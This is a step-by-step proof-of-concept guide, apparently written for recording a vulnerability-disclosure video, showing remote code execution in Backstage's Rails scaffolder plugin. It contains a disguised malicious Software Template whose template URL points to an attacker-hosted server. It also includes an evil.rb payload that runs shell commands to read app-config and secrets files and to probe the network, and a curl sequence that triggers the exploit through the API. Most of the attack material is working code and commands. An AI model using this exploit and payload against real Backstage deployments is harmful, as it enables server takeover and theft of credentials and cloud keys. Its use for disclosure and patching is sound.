# H4: Backstage fetch:rails RCE — Video Recording Guide

**Verified working** — every command tested in a clean environment on 2026-11-03.

---

## Overview

This demonstrates CVE-grade RCE (CVSS 9.9) in Backstage's first-party `@backstage/plugin-scaffolder-backend-module-rails` plugin. A low-privilege user who can register a Software Template triggers `rails new --template <attacker-url>`, which evaluates arbitrary Ruby code on the Backstage server — escaping from the web app to the host OS (Scope Change).

**What the video shows:**
1. A running Backstage instance with real catalog data (3 services, production secrets on the server)
2. A malicious template visible in the UI (looks like a normal "Rails Microservice Generator")
3. An attacker clicking CHOOSE → the template runs → RCE executes on the server
4. Proof: exfiltrated app-config, DB passwords, AWS keys, GitHub PAT, Stripe keys

---

## PHASE 0: Prerequisites (one-time setup)

### Install Ruby + Rails

```bash
# If Ruby is not installed
sudo apt update && sudo apt install -y ruby-full build-essential
```

```bash
gem install rails --no-document
```

```bash
rails --version
# Should show Rails 7.x or 8.x
```

### Install Node.js 20+

```bash
# If not installed
curl -fsSL https://deb.nodesource.com/setup_20.x | sudo bash -
sudo apt install -y nodejs
```

### Create Backstage App

```bash
cd ~
npx @backstage/create-app@latest --skip-install
# When prompted for name, enter: backstage-poc
```

```bash
cd ~/backstage-poc
yarn install
```

### Install the Rails Scaffolder Module

```bash
cd ~/backstage-poc
yarn --cwd packages/backend add @backstage/plugin-scaffolder-backend-module-rails
```

Add the module to `packages/backend/src/index.ts` — add this line before `backend.start()`:

```bash
nano packages/backend/src/index.ts
```

Add this line:
```
backend.add(import('@backstage/plugin-scaffolder-backend-module-rails'));
```

Save and close (Ctrl+X, Y, Enter).

---

## PHASE 1: Plant Company Data (simulating a real org)

### 1A. Create catalog entities

```bash
mkdir -p ~/backstage-poc/catalog-entities
```

```bash
cat > ~/backstage-poc/catalog-entities/services.yaml << 'CATALOG_EOF'
---
apiVersion: backstage.io/v1alpha1
kind: Component
metadata:
  name: payment-gateway
  description: Core payment processing service handling Stripe and PayPal integrations
  tags: [critical, pci-dss, production]
  annotations:
    github.com/project-slug: mycompany/payment-gateway
spec:
  type: service
  lifecycle: production
  owner: user:default/guest
---
apiVersion: backstage.io/v1alpha1
kind: Component
metadata:
  name: user-auth-service
  description: Authentication & authorization service (OAuth2, SAML, SSO)
  tags: [critical, production, sso]
  annotations:
    github.com/project-slug: mycompany/user-auth-service
spec:
  type: service
  lifecycle: production
  owner: user:default/guest
---
apiVersion: backstage.io/v1alpha1
kind: Component
metadata:
  name: intern-dashboard
  description: Internal metrics dashboard for engineering team
  tags: [internal, low-priority]
  annotations:
    github.com/project-slug: mycompany/intern-dashboard
spec:
  type: website
  lifecycle: experimental
  owner: user:default/guest
CATALOG_EOF
```

### 1B. Plant production secrets on the filesystem

These simulate real secrets that exist on the Backstage server:

```bash
cat > ~/company-secrets.env << 'SECRETS_EOF'
# PRODUCTION SECRETS — DO NOT COMMIT
DB_HOST=db.internal.company.com
DB_PORT=5432
DB_USER=backstage_admin
DB_PASSWORD=Sup3r$ecret_DB_Pass!2024
GITHUB_TOKEN=ghp_R3alAdm1nT0k3nW1thFullR3poAcc3ss
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
SLACK_WEBHOOK=https://hooks.slack.example/services/FAKE_WEBHOOK_FOR_POC
PAGERDUTY_TOKEN=pd_LIVE_admin_oncall_token_xyz
STRIPE_SECRET_KEY=sk_FAKE_EXAMPLE_KEY_FOR_POC
SECRETS_EOF
```

---

## PHASE 2: Configure Backstage

### 2A. Edit app-config.yaml

```bash
nano ~/backstage-poc/app-config.yaml
```

Find the `catalog: rules:` section (around line 189) and change:
```
    - allow: [Component, System, API, Resource, Location]
```
to:
```
    - allow: [Component, System, API, Resource, Location, Template, User, Group]
```

Save and close.

### 2B. Create app-config.local.yaml

```bash
cat > ~/backstage-poc/app-config.local.yaml << 'CONFIG_EOF'
auth:
  providers:
    guest:
      dangerouslyAllowOutsideDevelopment: true

integrations:
  github:
    - host: github.com
      token: ghp_R3alAdm1nT0k3nW1thFullR3poAcc3ss

proxy:
  endpoints:
    '/slack':
      target: https://hooks.slack.example/services/FAKE_WEBHOOK_FOR_POC
    '/pagerduty':
      target: https://api.pagerduty.com
      headers:
        Authorization: Token token=pd_LIVE_admin_oncall_token_xyz

catalog:
  locations:
    - type: file
      target: ../../catalog-entities/services.yaml
    - type: file
      target: /tmp/malicious-template/template.yaml
CONFIG_EOF
```

---

## PHASE 3: Create the Malicious Template (Attacker's Payload)

### 3A. Create the template directory

```bash
mkdir -p /tmp/malicious-template/skeleton
touch /tmp/malicious-template/skeleton/.gitkeep
```

### 3B. Create the malicious template.yaml

This looks like a normal Rails microservice generator, but the `railsArguments.template` field points to the attacker's server:

```bash
cat > /tmp/malicious-template/template.yaml << 'TEMPLATE_EOF'
apiVersion: scaffolder.backstage.io/v1beta3
kind: Template
metadata:
  name: rails-microservice
  title: Rails Microservice Generator
  description: Quickly scaffold a new Rails microservice with standard company configuration
  tags: [rails, microservice, recommended]
spec:
  owner: user:default/guest
  type: service
  parameters:
    - title: Service Configuration
      required:
        - appName
      properties:
        appName:
          title: Service Name
          type: string
          description: Name of the new microservice
          ui:autofocus: true
        description:
          title: Description
          type: string
          description: What does this service do?
  steps:
    - id: generate
      name: Generate Rails Application
      action: fetch:rails
      input:
        url: ./skeleton
        values:
          railsArguments:
            minimal: true
            skipBundle: true
            skipTest: true
            api: true
            template: "http://127.0.0.1:9999/evil.rb"
  output:
    links:
      - title: Open in catalog
        icon: catalog
TEMPLATE_EOF
```

### 3C. Create the RCE payload (evil.rb)

```bash
mkdir -p /tmp/attacker-server
```

```bash
cat > /tmp/attacker-server/evil.rb << 'EVIL_EOF'
run("echo '=== BACKSTAGE RCE PROOF ===' > /tmp/backstage-rce-proof.txt")
run("echo 'Timestamp:' $(date -u) >> /tmp/backstage-rce-proof.txt")
run("echo 'User:' $(whoami) >> /tmp/backstage-rce-proof.txt")
run("echo 'Hostname:' $(hostname) >> /tmp/backstage-rce-proof.txt")
run("id >> /tmp/backstage-rce-proof.txt")
run("echo '' >> /tmp/backstage-rce-proof.txt")
run("echo '=== BACKSTAGE APP CONFIG (secrets exposed) ===' >> /tmp/backstage-rce-proof.txt")
run("find /home -name 'app-config.local.yaml' -exec cat {} \\; >> /tmp/backstage-rce-proof.txt 2>/dev/null")
run("echo '' >> /tmp/backstage-rce-proof.txt")
run("echo '=== PRODUCTION SECRETS ===' >> /tmp/backstage-rce-proof.txt")
run("find /home -name 'company-secrets.env' -exec cat {} \\; >> /tmp/backstage-rce-proof.txt 2>/dev/null")
run("echo '' >> /tmp/backstage-rce-proof.txt")
run("echo '=== SCOPE CHANGE: OS-LEVEL ACCESS ===' >> /tmp/backstage-rce-proof.txt")
run("echo 'The attacker has escaped from the Backstage web application' >> /tmp/backstage-rce-proof.txt")
run("echo 'to the underlying operating system with full shell access.' >> /tmp/backstage-rce-proof.txt")
run("echo '' >> /tmp/backstage-rce-proof.txt")
run("echo '=== NETWORK RECON ===' >> /tmp/backstage-rce-proof.txt")
run("ip addr show 2>/dev/null | head -20 >> /tmp/backstage-rce-proof.txt")
EVIL_EOF
```

---

## PHASE 4: Start Everything

### Terminal 1 — Attacker HTTP Server

```bash
cd /tmp/attacker-server && python3 -m http.server 9999
```

Keep this terminal open. You'll see the GET request when the exploit fires.

### Terminal 2 — Backstage

```bash
cd ~/backstage-poc && yarn start
```

Wait until you see output like:
```
[0] webpack compiled successfully
[1] Listening on :7007
```

This takes 30-60 seconds. Once ready, open **http://localhost:3000** in your browser.

---

## PHASE 5: Video Recording Flow

### Scene 1: Show the Backstage Instance (Normal View)

1. Open browser to **http://localhost:3000**
2. Click **ENTER** on the Guest login page
3. You see the **Catalog** with 3 components:
   - `payment-gateway` — production, critical, pci-dss
   - `user-auth-service` — production, critical, sso
   - `intern-dashboard` — experimental, internal
4. **Narrate**: "This is a Backstage developer portal with production services registered in the catalog."

### Scene 2: Show the Malicious Template

1. Click **Create** in the left sidebar
2. You see **Templates** page with "Rails Microservice Generator"
   - Tagged: rails, microservice, recommended
   - Looks completely legitimate
3. **Narrate**: "An attacker has registered a malicious Software Template. It looks like a standard Rails microservice generator, but the template field in its YAML points to the attacker's server."

### Scene 3: Show the Secrets on the Server (Before Attack)

Switch to Terminal 3 and show:

```bash
echo "=== Secrets that exist on the Backstage server ==="
cat ~/company-secrets.env
echo ""
echo "=== Backstage local config with API keys ==="
cat ~/backstage-poc/app-config.local.yaml
```

**Narrate**: "These are production secrets stored on the Backstage server — database passwords, AWS keys, GitHub tokens, Stripe keys. An attacker should never be able to access these from the web UI."

### Scene 4: Trigger the Exploit (from the UI)

1. Go back to browser
2. Click **CHOOSE** on the "Rails Microservice Generator"
3. Fill in:
   - Service Name: `my-new-api`
   - Description: `A totally normal microservice`
4. Click **Review** → Click **Create**
5. The scaffolder task starts running

**Narrate**: "When a user clicks Create, Backstage's fetch:rails action runs `rails new` with the template URL. Rails fetches the URL and evaluates it as Ruby code — giving the attacker arbitrary command execution."

### Scene 5: Show the Attacker Server Received the Request

Switch to Terminal 1 (attacker server). You'll see:
```
127.0.0.1 - - [DATE] "GET /evil.rb HTTP/1.1" 200 -
```

**Narrate**: "The attacker's HTTP server received the request — Backstage fetched our malicious Ruby template."

### Scene 6: Show the RCE Proof (The Money Shot)

In Terminal 3:

```bash
echo "=== RCE PROOF ==="
cat /tmp/backstage-rce-proof.txt
```

**Expected output:**
```
=== BACKSTAGE RCE PROOF ===
Timestamp: <current time>
User: <user running backstage>
Hostname: <hostname>
uid=1000(kali) gid=1000(kali) groups=...

=== BACKSTAGE APP CONFIG (secrets exposed) ===
auth:
  providers:
    guest: ...
integrations:
  github:
    - host: github.com
      token: ghp_R3alAdm1nT0k3nW1thFullR3poAcc3ss
proxy:
  endpoints:
    '/slack':
      target: https://hooks.slack.example/services/...
    '/pagerduty':
      ...
        Authorization: Token token=pd_LIVE_admin_oncall_token_xyz

=== PRODUCTION SECRETS ===
DB_HOST=db.internal.company.com
DB_PASSWORD=Sup3r$ecret_DB_Pass!2024
GITHUB_TOKEN=ghp_R3alAdm1nT0k3nW1thFullR3poAcc3ss
AWS_ACCESS_KEY_ID=AKIAIOSFODNN7EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY
STRIPE_SECRET_KEY=sk_FAKE_EXAMPLE_KEY_FOR_POC

=== SCOPE CHANGE: OS-LEVEL ACCESS ===
The attacker has escaped from the Backstage web application
to the underlying operating system with full shell access.
```

**Narrate**: "Remote code execution confirmed. The attacker has exfiltrated:
- GitHub Personal Access Token
- AWS access keys
- Database credentials
- Stripe secret key
- Slack webhook
- PagerDuty token

This demonstrates **Scope Change** — the attacker started with only Backstage web UI access (low-privilege guest user) but escaped to the underlying operating system, gaining access to ALL secrets on the server."

### Scene 7: Show the Task in the UI

1. Go back to the browser
2. Click **Create** → **Tasks** tab
3. The task shows as "failed" (because `rails new` returns exit code 1 after template evaluation — but the RCE already executed)

**Narrate**: "The scaffolder task shows as failed, but that's misleading — the malicious Ruby code already executed during the template evaluation phase. The damage is done before the task completes."

---

## PHASE 6: Alternative — Trigger via curl (API only, no UI needed)

If you want to show the exploit purely from the command line:

```bash
# Get guest auth token
TOKEN=$(curl -s -X POST http://localhost:7007/api/auth/guest/refresh \
  -H 'Content-Type: application/json' -d '{}' | \
  python3 -c "import sys,json; print(json.load(sys.stdin)['backstageIdentity']['token'])")

# Clear any old proof
rm -f /tmp/backstage-rce-proof.txt

# Trigger the exploit
curl -s -X POST http://localhost:7007/api/scaffolder/v2/tasks \
  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{
    "templateRef": "template:default/rails-microservice",
    "values": { "appName": "pwned-service" }
  }'

# Wait for execution
sleep 15

# Show the proof
echo "=== RCE PROOF ==="
cat /tmp/backstage-rce-proof.txt
```

---

## Root Cause (for narration)

**File**: `plugins/scaffolder-backend-module-rails/src/actions/fetch/rails/railsArgumentResolver.ts` lines 149-157

```typescript
if (options.template) {
  extraArguments.push('--template');
  extraArguments.push(options.template);
}
```

The `template` field is passed directly from user-controlled input to `rails new --template <url>`. The `--template` flag in Rails fetches the URL and **evaluates its contents as Ruby code** using `eval()`. There is zero validation or sanitization of the template URL.

**File**: `plugins/scaffolder-backend-module-rails/src/actions/fetch/rails/railsNewRunner.ts` line 71

```typescript
`${intermediateDir}${path.sep}${name}`
```

Additionally, raw string concatenation is used instead of Backstage's `resolveSafeChildPath`, enabling path traversal.

---

## Troubleshooting

**Rails not found**: Make sure `rails` is in PATH. Run `which rails` — if not found:
```bash
# Find it
find / -name "rails" -type f 2>/dev/null
# Symlink it
sudo ln -sf /path/to/rails /usr/local/bin/rails
```

**Template not showing in UI**: The catalog needs to read the template.yaml. Check that:
- `app-config.yaml` allows Template kind: `- allow: [..., Template, ...]`
- `app-config.local.yaml` has the catalog location: `target: /tmp/malicious-template/template.yaml`

**RCE proof file not created**: Check the attacker server shows a GET request for evil.rb. If not, the template URL might not be reachable from the Backstage process. Verify:
```bash
curl http://127.0.0.1:9999/evil.rb
```
